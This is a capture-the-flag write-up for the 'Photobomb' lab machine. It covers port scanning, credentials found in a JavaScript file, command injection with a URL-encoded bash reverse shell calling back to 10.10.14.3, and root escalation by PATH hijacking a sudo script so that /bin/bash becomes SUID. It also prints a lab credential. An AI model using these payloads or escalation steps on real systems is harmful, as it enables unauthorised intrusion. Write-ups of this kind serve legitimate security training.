### Host entries:
```bash
10.10.11.182    photobomb.htb
```

# Content

- Web Enumeration
- Source Code analysis found credentials
- Command Injection
- Path Hijacking

# Reconnaissance

Initial reconnaissance for TCP ports
```bash
nmap -p- -sS --open --min-rate 500 -Pn -n -vvv -oG allPorts 10.10.11.182
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.11.182 ()   Status: Up
Host: 10.10.11.182 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
```
Services and Versions running:
```bash
nmap -p22,80 -sCV -Pn -n -vvv -oN targeted 10.10.11.182
Nmap scan report for 10.10.11.182
Host is up, received user-set (0.073s latency).
Scanned at 2023-02-04 06:44:24 GMT for 9s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e22473bbfbdf5cb520b66876748ab58d (RSA)
| ssh-rsa 
...
|   256 04e3ac6e184e1b7effac4fe39dd21bae (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBrVE9flXamwUY+wiBc9IhaQJRE40YpDsbOGPxLWCKKjNAnSBYA9CPsdgZhoV8rtORq/4n+SO0T80x1wW3g19Ew=
|   256 20e05d8cba71f08c3a1819f24011d29e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEp8nHKD5peyVy3X3MsJCmH/HIUvJT+MONekDg5xYZ6D
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Only port 80 open, fuzzing retrieves the following entries:
```bash
dirsearch -u http://photobomb.htb                                                                             
...
Target: http://photobomb.htb/

[19:36:43] Starting: 
[19:37:51] 200 -   11KB - /favicon.ico
[19:38:21] 401 -  590B  - /printer
```
Trying to access to this endpoint "/printer" we identify a login prompt which requests credentials that we lack of:
![[Pasted image 20230204133943.png]]
So nothing useful there, after enumerating the machine we receive the following 404 error:
![[Pasted image 20230204134703.png]]
Searching about this Sinatra software we come to this article about [Reflected File Download](https://www.blackhat.com/docs/eu-14/materials/eu-14-Hafif-Reflected-File-Download-A-New-Web-Attack-Vector.pdf) which explains what is the attack vector and how it can be exploited:
![[Pasted image 20230204134845.png]]
Basically it breaks the command by adding a "||" which is an OR operator, so abusing of this same exploit we tried to craft ours as well, we retrieve the following error on BurpSuite that gives us an error with the software used by the application:
![[Pasted image 20230204135106.png]]
WEBrick 1.6.0 and Ruby 2.7.0 is being used, so using searchsploit to find something useful we identify at least three exploits:
```bash
searchsploit webrick
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title            |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Ruby 1.9 - 'WEBrick::HTTP::DefaultFileHandler' Crafted HTTP Request Denial of Service    | multiple/dos/32222.rb
Ruby 1.9.1 - WEBrick 'Terminal Escape Sequence in Logs' Command Injection                | multiple/remote/33489.txt
Ruby on Rails 3.0.5 - 'WEBrick::HTTPRequest' Module HTTP Header Injection                | multiple/remote/35352.rb
```
Since the first one is only a DoS which we don't want to exploit and the third one is using a Ruby version that the server is not running, let's try and check it out what about the second one:
```bash
Ruby WEBrick is prone to a command-injection vulnerability because it fails to adequately sanitize user-supplied input in log files.

Attackers can exploit this issue to execute arbitrary commands in a terminal.

Versions *prior to* the following are affected:

Ruby 1.8.6 patchlevel 388
Ruby 1.8.7 patchlevel 249
Ruby 1.9.1 patchlevel 378

The following example is available:

% xterm -e ruby -rwebrick -e 'WEBrick::HTTPServer.new(:Port=>8080).start' &
% wget http://www.example.com:8080/%1b%5d%32%3b%6f%77%6e%65%64%07%0a
```
Something useful, by using this payload URL-encoded and decoded it we retrieve the following payload:
![[Pasted image 20230204135330.png]]
It seems like it is working(?) by adding a command that sends something to our server and starting a tcpdump we'll be able to check if whether or not is working:
![[Pasted image 20230204135533.png]]
And we also received the ping request on our machine:
```bash
tcpdump -i tun0 -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
19:54:51.815885 IP 10.10.14.3.56582 > 10.10.11.182.80: Flags [S], seq 817744440, win 64240, options [mss 1460,sackOK,TS val 3803628192 ecr 0,nop,wscale 7], length 0
19:54:51.890240 IP 10.10.11.182.80 > 10.10.14.3.56582: Flags [S.], seq 3194106053, ack 817744441, win 65160, options [mss 1337,sackOK,TS val 3095281247 ecr 3803628192,nop,wscale 7], length 0
...
19:54:52.037547 IP 10.10.11.182.80 > 10.10.14.3.56582: Flags [.], ack 398, win 506, options [nop,nop,TS val 3095281395 ecr 3803628340], length 0
```
However we weren't able to go further, no other command was available from here. So let's keep enumerating the web server.
After some basic enumeration we identify some sensitive data in source code on photobomb.js file:
![[Pasted image 20230204135739.png]]
Seems like these are credentials for the /printer endpoint...
# Exploitation
It seems like a web page that downloads images:
![[Pasted image 20230204135851.png]]
While trying to download an image we intercept this request in Burpsuite:
![[Pasted image 20230204140012.png]]
We tried SQLi, XSS and a lot of web attacks but the one that retrieves something useful was command injection (we already knew about this software being vulnerable as per previous research) so by adding a basic command on this machine we received the following error:
![[Pasted image 20230204140155.png]]
The output is not sent in the response, however this seems interesting, so let's try to send a reverse shell with the following payload (URL-encoded):
```bash
bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.3/1234+0>%261'
```
![[Pasted image 20230204140251.png]]
And voila we get a shell as the wizard user:
```bash
wizard@photobomb:~/photobomb$ whoami
whoami
wizard
```
# Root privesc
First let's get a [[Fully interactive TTY (Linux)]]  and let's enumerate the machine:
```bash
# Ip of the machine
ifconfig
inet 10.10.11.182  netmask 255.255.254.0  broadcast 10.10.11.255
# SUID
find / -perm -4000 2>/dev/null
# Execution with sudo
wizard@photobomb:~$ sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```
Now that's interesting, we are able to execute a customized script called cleanup.sh as sudo let's check this out: ^2939e0
```bash
##################  cleanup.sh  ############################
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```
As we can see the "find" command is being executed without relative path (such as /bin/cat or /usr/bin/truncate) so this gives us an entry point of a privesc.
In order to hijack a PATH environment we need to first craft a script called as the name of the vulnerable variable, in this case "find":
```bash
# Script that will give special permission to the bash to be run as root without password.
wizard@photobomb:~$ cat find
#!/bin/bash
chmod 4755 /bin/bash
```
Then we need to hijack the environment "PATH" variable with the folder where this new crafted "find" script is located:
```bash
# Actual PATH environment variable:
wizard@photobomb:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
# PATH that we need to inject on such $PATH variable:
wizard@photobomb:~$ echo $PWD
/home/wizard
```
It is of upmost importance to give permissions to the script:
```bash
wizard@photobomb:~$ chmod +x find
```
This way, since the order where a script looks for a non-relative path command/library is from left to right on the $PATH variable, first place that will lookup is the /home/wizard path, to do so we can execute the command adding the PATH environment:
```bash
# export command to add /home/wizard to the PATH
wizard@photobomb:~$ sudo PATH=$PWD:$PATH /opt/cleanup.sh 
wizard@photobomb:~$ ls -al /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```
Finally we can execute the /bin/bash as a root user with the following command:
```bash
wizard@photobomb:~$ /bin/bash -p
bash-5.0# whoami
root
```
# Credentials
```bash
# Access for /printer to be found at /photobomb.js
pH0t0:b0Mb!
```
# Notes

- Path Hijacking is better to be run on the same command to be executed since exchanging the PATH variable and then run the command does not always work:
```bash
sudo PATH=$PWD:$PATH /opt/cleanup.sh
```

# Resources:



